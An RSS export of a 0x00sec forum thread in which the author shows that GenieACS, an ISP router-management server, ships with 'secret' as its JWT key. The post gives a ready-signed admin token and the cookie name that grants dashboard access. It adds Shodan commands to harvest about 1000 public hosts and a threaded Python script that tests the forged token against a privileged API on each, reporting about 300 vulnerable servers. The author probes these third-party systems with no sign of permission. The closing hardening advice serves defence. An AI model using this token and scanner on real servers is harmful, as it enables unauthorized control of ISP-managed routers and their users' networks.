@@ -1,0 +1,416 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>GenieACS And The Tale Of Default JWT Secret</title>
+    <link>https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738</link>
+    <description>## BackDrop:
+So i was scouring shodan the other day and found this interesting piece of software called [GenieACS](&quot;https://github.com/genieacs/genieacs&quot;), now GenieACS is a &quot;Auto Configuration Server&quot; for [TR-069](&quot;https://en.wikipedia.org/wiki/TR-069&quot;) enabled routers and similar devices, what this ACS server does is that it enables the ISP to perform firmware upgrades or change the wifi password remotely(among other things).  
+Routers are configured with a ACS server url and a user-pass combo to authenticate itself against the ACS, the router then periodically checks into the ACS using the TR-069 protocl (which is basically a XML API over HTTP) and then download and applies any configuration changes indicated by the ACS. ACS servers are fairly common among ISPs and other sufficient large network operators. GenieACS is also a opesource solution, so kudos to that.
+
+## The Problem:
+Once i discovered GenieACS, i naturally started browsing its installation and configuration instructions to find its default credentials, instead i come across something very interesting...
+
+![jwt|690x231](upload://qwysJeXoTyQYmAHJok0a49T9RMS.png)
+
+
+now i started wondering how many might have actually bothered to change that, well how many installing GenieACS might actually know what [jwt](&quot;https://en.wikipedia.org/wiki/JSON_Web_Token&quot;) is ? (not everyone is a programmer).
+If anyone is using &quot;secret&quot; as the secret (duh!), we should be able to create a jwt token, sign it and then use this token to log into  GenieACS. 
+
+***Lets find out how many made that mistake.*** 
+
+Before go any further lets take a look at the jwt token format that GenieACS uses.
+The Token must contain the following data:
+`{
+  &quot;username&quot;: &quot;admin&quot;,
+  &quot;authMethod&quot;: &quot;local&quot;,
+  &quot;iat&quot;: 1782574412
+}`
+
+&gt;I discovered the format by installing GenieACS locally, logging in and then extracting and analyzing the jwt token it stored in the browser
+
+The following is a signed token with expiry set to a few years in the future:
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXV0aE1ldGhvZCI6ImxvY2FsIiwiaWF0IjoxNzgyNTc0NDEyfQ.y2JaygP5n4WBYQ_dytgS0qet0b6KvtT31UJWqee4L6c
+```
+you can visualize it using [jwt.io](&quot;https://jwt.io&quot;)
+
+All one needs to do, to gain access to a instance using &quot;secret&quot; as its secret, is to set a cookie named ***genieacs-ui-jwt***, with its value being the jwt token we justed cooked up.
+
+
+![genie1|690x399](upload://yagteVz3ymRrM3uEikObKmvJyZc.png)
+
+Once the cookie is set, on refreshing the page we should be presented with the dashboard.
+
+![genie2|690x343](upload://tb8IMsBAxsD8IXwUN7v8XjdStKN.png)
+
+
+
+## Finding Exposed Instances
+So lets use shodan to see how widespread this issue is, we&#39;ll use the query `http.html:&quot;GenieACS&quot;`
+![shodan|690x348](upload://lQ2Ji1GgiC7GCo3JvpHKYG0X5nk.png)
+looks like we have quite a few.
+
+-	Lets quickly grab those addresses using shodan cli
+	`shodan search &#39;http.html:&quot;genieacs&quot;&#39; --limit 1000 &gt; raw`
+
+-	Clean the data to obatin only ip addresses and ports
+	`cat raw| cut -f1,2 &gt; ip.txt`
+
+We will now build a python script to verify the misconfiguration.
+
+### Scanning For The Misconfiguration
+We&#39;ll use the following script to get our job done. (*it&#39;ll need the ip.txt file we created earlier*)
+
+The script basically does the following:
+-	Use the jwt token and visit a privileged api endpoint, if we get a 200 status code we know the
+	server is misconfigured.
+-   It also verifies whether the server uses TLS and adjusts the url accordingly.
+
+```
+import requests
+import urllib3
+import threading
+
+urllib3.disable_warnings()
+
+cookies = {
+    &#39;genieacs-ui-jwt&#39;: &#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXV0aE1ldGhvZCI6ImxvY2FsIiwiaWF0IjoxNzgyNTc0NDEyfQ.y2JaygP5n4WBYQ_dytgS0qet0b6KvtT31UJWqee4L6c&#39;,
+}
+
+headers = {
+    &#39;Accept&#39;: &#39;application/json, text/*&#39;,
+    &#39;Accept-Language&#39;: &#39;en-US,en&#39;,
+    &#39;Connection&#39;: &#39;keep-alive&#39;
+}
+
+def check_host(url):
+    try:
+        response = requests.get(url+&#39;/api/presets/?filter=true&#39;, cookies=cookies,headers=headers, verify=False)
+        if response.status_code==200:
+            print(&quot;[+] &quot;,url)
+    except:
+        pass
+
+def const_url(ip,port):
+    if(port!=443):
+        try:
+            res = requests.get(&quot;http://&quot;+ip+&quot;:&quot;+port,timeout=5)
+        except:
+            url = &quot;http://&quot;+ip+&quot;:&quot;+port
+            return url
+            
+        if(res.status_code==400):
+            #its https , we sent http request to https port
+            url = &quot;https://&quot;+ip+&quot;:&quot;+port
+            return url
+        else:
+            url = &quot;http://&quot;+ip+&quot;:&quot;+port
+            return url
+    else:
+        url = &quot;https://&quot;+ip+&quot;:&quot;+port
+        return url
+
+def check_misconf(ip,port):
+    check_host(const_url(ip,port))
+
+with open(&#39;ip.txt&#39;) as infile:
+    for line in infile:
+        try:
+            ip,port = str(line).split()
+            thread  = threading.Thread(target=check_misconf,args=(ip,str(port)))
+            thread.start()
+        except:
+            print(&quot;err&quot;)
+            pass
+```
+We now run `python3 script.py &gt; found.txt`.
+
+## Analysis
+We had about a thousand addresses which we obtained from shodan
+![wc-ip|690x121, 75%](upload://sbOos8aykoPJEqGBYw7FJK2Hfc2.png)
+
+Our Script found around 300 servers which used &quot;secret&quot; as the secret
+![wc-found|579x140, 75%](upload://czQE2mFRNE0J7bTDxOrLDzhA5ca.png)
+
+
+Now thats about 30% of the instances that we analyzed.
+
+## Takeaways
+1) People install sofware with their eyes closed, they love copy pasting random commands.
+    In the case of GenieACS had their documentation said 
+
+   *Run this command to Setup genie :*
+   `genieacs-ui --ui-jwt-secret $(head -10 /dev/random|md5sum)`
+
+   *Instead of* 
+
+   `genieacs-ui --ui-jwt-secret secret`
+
+   The fate we saw above could be avaoided.
+
+2) Write documentation carefully, account for the ingenuity of the stupid.
+
+3) Change default secrets/credentials even if you dont know what you&#39;re doing, ALWAYS!!!
+
+## Further Reading
+1) https://semgrep.dev/blog/2020/hardcoded-secrets-unverified-tokens-and-other-common-jwt-mistakes</description>
+    
+    <lastBuildDate>Tue, 03 Jan 2023 13:07:50 +0000</lastBuildDate>
+    <category>Web Hacking</category>
+    <atom:link href="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>GenieACS And The Tale Of Default JWT Secret</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738/9">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738/9</link>
+        <pubDate>Wed, 03 May 2023 04:25:39 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-32738-9</guid>
+        <source url="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738.rss">GenieACS And The Tale Of Default JWT Secret</source>
+      </item>
+      <item>
+        <title>GenieACS And The Tale Of Default JWT Secret</title>
+        <dc:creator><![CDATA[messede]]></dc:creator>
+        <description><![CDATA[
+            <p>Agreed shodan is such a great service, especially when it comes to proving a point.</p>
+          <p><a href="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738/8">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738/8</link>
+        <pubDate>Tue, 03 Jan 2023 13:07:50 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-32738-8</guid>
+        <source url="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738.rss">GenieACS And The Tale Of Default JWT Secret</source>
+      </item>
+      <item>
+        <title>GenieACS And The Tale Of Default JWT Secret</title>
+        <dc:creator><![CDATA[hatecomputers]]></dc:creator>
+        <description><![CDATA[
+            <p>This is pretty awesome. Happy to see someone doing SDR aka “shodan driven research” as I like to call it <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"> Again, pretty dope finding.</p>
+          <p><a href="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738/7">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738/7</link>
+        <pubDate>Tue, 03 Jan 2023 13:06:00 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-32738-7</guid>
+        <source url="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738.rss">GenieACS And The Tale Of Default JWT Secret</source>
+      </item>
+      <item>
+        <title>GenieACS And The Tale Of Default JWT Secret</title>
+        <dc:creator><![CDATA[messede]]></dc:creator>
+        <description><![CDATA[
+            <aside class="quote no-group" data-username="c0z" data-post="5" data-topic="32738">
+<div class="title">
+<div class="quote-controls"></div>
+<img loading="lazy" alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/c0z/40/42163_2.png" class="avatar"> c0z:</div>
+<blockquote>
+<p>very commen just like all other credentials</p>
+</blockquote>
+</aside>
+<p>yes, but not everyone treats them as such, its like “My MySQL DB’s password is root but so what its not like i’m exposing it to the internet.”, JWT doesn’t immediately come off as something that you use to log into a system (for a average user) hence the negligence.</p>
+<p>The whole thing about not using default passwords for internet facing devices took a while to seep into everyone’s head, i wonder how long it would take to understand the JWT situation.</p>
+          <p><a href="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738/6">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738/6</link>
+        <pubDate>Tue, 03 Jan 2023 12:01:50 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-32738-6</guid>
+        <source url="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738.rss">GenieACS And The Tale Of Default JWT Secret</source>
+      </item>
+      <item>
+        <title>GenieACS And The Tale Of Default JWT Secret</title>
+        <dc:creator><![CDATA[c0z]]></dc:creator>
+        <description><![CDATA[
+            <p>Default creds in JWT’s are very commen just like all other credentials. I was reading another blog post and the vendor had used ‘secret’ and ‘verysecret’.</p>
+          <p><a href="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738/5</link>
+        <pubDate>Tue, 03 Jan 2023 10:26:54 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-32738-5</guid>
+        <source url="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738.rss">GenieACS And The Tale Of Default JWT Secret</source>
+      </item>
+      <item>
+        <title>GenieACS And The Tale Of Default JWT Secret</title>
+        <dc:creator><![CDATA[0xbro]]></dc:creator>
+        <description><![CDATA[
+            <p>This was very interesting! Nice research, thanks for sharing it!</p>
+          <p><a href="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738/4</link>
+        <pubDate>Tue, 03 Jan 2023 08:58:09 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-32738-4</guid>
+        <source url="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738.rss">GenieACS And The Tale Of Default JWT Secret</source>
+      </item>
+      <item>
+        <title>GenieACS And The Tale Of Default JWT Secret</title>
+        <dc:creator><![CDATA[camel]]></dc:creator>
+        <description><![CDATA[
+            <p>This was an <strong>awesome</strong> bite sized post! As I am interested in web exploitation (and just general web development), this was a great find.</p>
+          <p><a href="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738/3</link>
+        <pubDate>Mon, 02 Jan 2023 23:44:21 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-32738-3</guid>
+        <source url="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738.rss">GenieACS And The Tale Of Default JWT Secret</source>
+      </item>
+      <item>
+        <title>GenieACS And The Tale Of Default JWT Secret</title>
+        <dc:creator><![CDATA[crimsonRain]]></dc:creator>
+        <description><![CDATA[
+            <p>Great post! Looking forward to more in the future.</p>
+          <p><a href="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738/2</link>
+        <pubDate>Mon, 02 Jan 2023 01:01:30 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-32738-2</guid>
+        <source url="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738.rss">GenieACS And The Tale Of Default JWT Secret</source>
+      </item>
+      <item>
+        <title>GenieACS And The Tale Of Default JWT Secret</title>
+        <dc:creator><![CDATA[messede]]></dc:creator>
+        <description><![CDATA[
+            <h2>
+<a name="backdrop-1" class="anchor" href="https://0x00sec.org#backdrop-1"></a>BackDrop:</h2>
+<p>So i was scouring shodan the other day and found this interesting piece of software called <a href="https://0x00sec.org">GenieACS</a>, now GenieACS is a “Auto Configuration Server” for <a href="https://0x00sec.org">TR-069</a> enabled routers and similar devices, what this ACS server does is that it enables the ISP to perform firmware upgrades or change the wifi password remotely(among other things).<br>
+Routers are configured with a ACS server url and a user-pass combo to authenticate itself against the ACS, the router then periodically checks into the ACS using the TR-069 protocl (which is basically a XML API over HTTP) and then download and applies any configuration changes indicated by the ACS. ACS servers are fairly common among ISPs and other sufficient large network operators. GenieACS is also a opesource solution, so kudos to that.</p>
+<h2>
+<a name="the-problem-2" class="anchor" href="https://0x00sec.org#the-problem-2"></a>The Problem:</h2>
+<p>Once i discovered GenieACS, i naturally started browsing its installation and configuration instructions to find its default credentials, instead i come across something very interesting…</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/b/9/b9e6a2567b769dffefdc786719b4b880d5707cb2.png" data-download-href="/uploads/short-url/qwysJeXoTyQYmAHJok0a49T9RMS.png?dl=1" title="jwt" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/b/9/b9e6a2567b769dffefdc786719b4b880d5707cb2_2_690x231.png" alt="jwt" data-base62-sha1="qwysJeXoTyQYmAHJok0a49T9RMS" width="690" height="231" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/b/9/b9e6a2567b769dffefdc786719b4b880d5707cb2_2_690x231.png, https://0x00sec.s3.amazonaws.com/optimized/3X/b/9/b9e6a2567b769dffefdc786719b4b880d5707cb2_2_1035x346.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/b/9/b9e6a2567b769dffefdc786719b4b880d5707cb2.png 2x" data-dominant-color="181C1F"></a></div><p></p>
+<p>now i started wondering how many might have actually bothered to change that, well how many installing GenieACS might actually know what <a href="https://0x00sec.org">jwt</a> is ? (not everyone is a programmer).<br>
+If anyone is using “secret” as the secret (duh!), we should be able to create a jwt token, sign it and then use this token to log into  GenieACS.</p>
+<p><em><strong>Lets find out how many made that mistake.</strong></em></p>
+<p>Before go any further lets take a look at the jwt token format that GenieACS uses.<br>
+The Token must contain the following data:<br>
+<code>{   "username": "admin",   "authMethod": "local",   "iat": 1782574412 }</code></p>
+<blockquote>
+<p>I discovered the format by installing GenieACS locally, logging in and then extracting and analyzing the jwt token it stored in the browser</p>
+</blockquote>
+<p>The following is a signed token with expiry set to a few years in the future:</p>
+<pre><code class="lang-auto">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXV0aE1ldGhvZCI6ImxvY2FsIiwiaWF0IjoxNzgyNTc0NDEyfQ.y2JaygP5n4WBYQ_dytgS0qet0b6KvtT31UJWqee4L6c
+</code></pre>
+<p>you can visualize it using <a href="https://0x00sec.org">jwt.io</a></p>
+<p>All one needs to do, to gain access to a instance using “secret” as its secret, is to set a cookie named <em><strong>genieacs-ui-jwt</strong></em>, with its value being the jwt token we justed cooked up.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/f/ef72fc64f88ade8d21f3cb26d06e916054e43a22.png" data-download-href="/uploads/short-url/yagteVz3ymRrM3uEikObKmvJyZc.png?dl=1" title="genie1" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/f/ef72fc64f88ade8d21f3cb26d06e916054e43a22_2_690x399.png" alt="genie1" data-base62-sha1="yagteVz3ymRrM3uEikObKmvJyZc" width="690" height="399" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/f/ef72fc64f88ade8d21f3cb26d06e916054e43a22_2_690x399.png, https://0x00sec.s3.amazonaws.com/optimized/3X/e/f/ef72fc64f88ade8d21f3cb26d06e916054e43a22_2_1035x598.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/e/f/ef72fc64f88ade8d21f3cb26d06e916054e43a22_2_1380x798.png 2x" data-dominant-color="222426"></a></div><p></p>
+<p>Once the cookie is set, on refreshing the page we should be presented with the dashboard.</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/c/cc816ff84b2940b4583da0b2db5f1b0a0c9ca149.png" data-download-href="/uploads/short-url/tb8IMsBAxsD8IXwUN7v8XjdStKN.png?dl=1" title="genie2" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/c/cc816ff84b2940b4583da0b2db5f1b0a0c9ca149_2_690x343.png" alt="genie2" data-base62-sha1="tb8IMsBAxsD8IXwUN7v8XjdStKN" width="690" height="343" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/c/cc816ff84b2940b4583da0b2db5f1b0a0c9ca149_2_690x343.png, https://0x00sec.s3.amazonaws.com/optimized/3X/c/c/cc816ff84b2940b4583da0b2db5f1b0a0c9ca149_2_1035x514.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/c/c/cc816ff84b2940b4583da0b2db5f1b0a0c9ca149_2_1380x686.png 2x" data-dominant-color="1C1E1C"></a></div><p></p>
+<h2>
+<a name="finding-exposed-instances-3" class="anchor" href="https://0x00sec.org#finding-exposed-instances-3"></a>Finding Exposed Instances</h2>
+<p>So lets use shodan to see how widespread this issue is, we’ll use the query <code>http.html:"GenieACS"</code><br>
+</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/9/9/990fb807ac78e87e9433700635a65c1882f5f7a2.png" data-download-href="/uploads/short-url/lQ2Ji1GgiC7GCo3JvpHKYG0X5nk.png?dl=1" title="shodan" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/9/9/990fb807ac78e87e9433700635a65c1882f5f7a2_2_690x348.png" alt="shodan" data-base62-sha1="lQ2Ji1GgiC7GCo3JvpHKYG0X5nk" width="690" height="348" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/9/9/990fb807ac78e87e9433700635a65c1882f5f7a2_2_690x348.png, https://0x00sec.s3.amazonaws.com/optimized/3X/9/9/990fb807ac78e87e9433700635a65c1882f5f7a2_2_1035x522.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/9/9/990fb807ac78e87e9433700635a65c1882f5f7a2.png 2x" data-dominant-color="251F1F"></a></div><br>
+looks like we have quite a few.<p></p>
+<ul>
+<li>
+<p>Lets quickly grab those addresses using shodan cli<br>
+<code>shodan search 'http.html:"genieacs"' --limit 1000 &gt; raw</code></p>
+</li>
+<li>
+<p>Clean the data to obatin only ip addresses and ports<br>
+<code>cat raw| cut -f1,2 &gt; ip.txt</code></p>
+</li>
+</ul>
+<p>We will now build a python script to verify the misconfiguration.</p>
+<h3>
+<a name="scanning-for-the-misconfiguration-4" class="anchor" href="https://0x00sec.org#scanning-for-the-misconfiguration-4"></a>Scanning For The Misconfiguration</h3>
+<p>We’ll use the following script to get our job done. (<em>it’ll need the ip.txt file we created earlier</em>)</p>
+<p>The script basically does the following:</p>
+<ul>
+<li>Use the jwt token and visit a privileged api endpoint, if we get a 200 status code we know the<br>
+server is misconfigured.</li>
+<li>It also verifies whether the server uses TLS and adjusts the url accordingly.</li>
+</ul>
+<pre><code class="lang-auto">import requests
+import urllib3
+import threading
+
+urllib3.disable_warnings()
+
+cookies = {
+    'genieacs-ui-jwt': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXV0aE1ldGhvZCI6ImxvY2FsIiwiaWF0IjoxNzgyNTc0NDEyfQ.y2JaygP5n4WBYQ_dytgS0qet0b6KvtT31UJWqee4L6c',
+}
+
+headers = {
+    'Accept': 'application/json, text/*',
+    'Accept-Language': 'en-US,en',
+    'Connection': 'keep-alive'
+}
+
+def check_host(url):
+    try:
+        response = requests.get(url+'/api/presets/?filter=true', cookies=cookies,headers=headers, verify=False)
+        if response.status_code==200:
+            print("[+] ",url)
+    except:
+        pass
+
+def const_url(ip,port):
+    if(port!=443):
+        try:
+            res = requests.get("http://"+ip+":"+port,timeout=5)
+        except:
+            url = "http://"+ip+":"+port
+            return url
+            
+        if(res.status_code==400):
+            #its https , we sent http request to https port
+            url = "https://"+ip+":"+port
+            return url
+        else:
+            url = "http://"+ip+":"+port
+            return url
+    else:
+        url = "https://"+ip+":"+port
+        return url
+
+def check_misconf(ip,port):
+    check_host(const_url(ip,port))
+
+with open('ip.txt') as infile:
+    for line in infile:
+        try:
+            ip,port = str(line).split()
+            thread  = threading.Thread(target=check_misconf,args=(ip,str(port)))
+            thread.start()
+        except:
+            print("err")
+            pass
+</code></pre>
+<p>We now run <code>python3 script.py &gt; found.txt</code>.</p>
+<h2>
+<a name="analysis-5" class="anchor" href="https://0x00sec.org#analysis-5"></a>Analysis</h2>
+<p>We had about a thousand addresses which we obtained from shodan<br>
+</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/5/c592b6b79daf0c0394ad259a1e374075f169abee.png" data-download-href="/uploads/short-url/sbOos8aykoPJEqGBYw7FJK2Hfc2.png?dl=1" title="wc-ip" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/5/c592b6b79daf0c0394ad259a1e374075f169abee_2_517x90.png" alt="wc-ip" data-base62-sha1="sbOos8aykoPJEqGBYw7FJK2Hfc2" width="517" height="90" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/5/c592b6b79daf0c0394ad259a1e374075f169abee_2_517x90.png, https://0x00sec.s3.amazonaws.com/optimized/3X/c/5/c592b6b79daf0c0394ad259a1e374075f169abee_2_775x135.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/5/c592b6b79daf0c0394ad259a1e374075f169abee.png 2x" data-dominant-color="252537"></a></div><p></p>
+<p>Our Script found around 300 servers which used “secret” as the secret<br>
+<img src="https://0x00sec.s3.amazonaws.com/original/3X/5/8/58278000891daf0d10b5a0b58f7dd613eb69eed6.png" alt="wc-found" data-base62-sha1="czQE2mFRNE0J7bTDxOrLDzhA5ca" width="434" height="105"></p>
+<p>Now thats about 30% of the instances that we analyzed.</p>
+<h2>
+<a name="takeaways-6" class="anchor" href="https://0x00sec.org#takeaways-6"></a>Takeaways</h2>
+<ol>
+<li>
+<p>People install sofware with their eyes closed, they love copy pasting random commands.<br>
+In the case of GenieACS had their documentation said</p>
+<p><em>Run this command to Setup genie :</em><br>
+<code>genieacs-ui --ui-jwt-secret $(head -10 /dev/random|md5sum)</code></p>
+<p><em>Instead of</em></p>
+<p><code>genieacs-ui --ui-jwt-secret secret</code></p>
+<p>The fate we saw above could be avaoided.</p>
+</li>
+<li>
+<p>Write documentation carefully, account for the ingenuity of the stupid.</p>
+</li>
+<li>
+<p>Change default secrets/credentials even if you dont know what you’re doing, ALWAYS!!!</p>
+</li>
+</ol>
+<h2>
+<a name="further-reading-7" class="anchor" href="https://0x00sec.org#further-reading-7"></a>Further Reading</h2>
+<ol>
+<li><a href="https://semgrep.dev/blog/2020/hardcoded-secrets-unverified-tokens-and-other-common-jwt-mistakes" class="inline-onebox" rel="noopener nofollow ugc">Hardcoded secrets, unverified tokens, and other common JWT mistakes</a></li>
+</ol>
+          <p><a href="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738/1</link>
+        <pubDate>Sun, 01 Jan 2023 12:24:49 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-32738-1</guid>
+        <source url="https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738.rss">GenieACS And The Tale Of Default JWT Secret</source>
+      </item>
+  </channel>
+</rss>
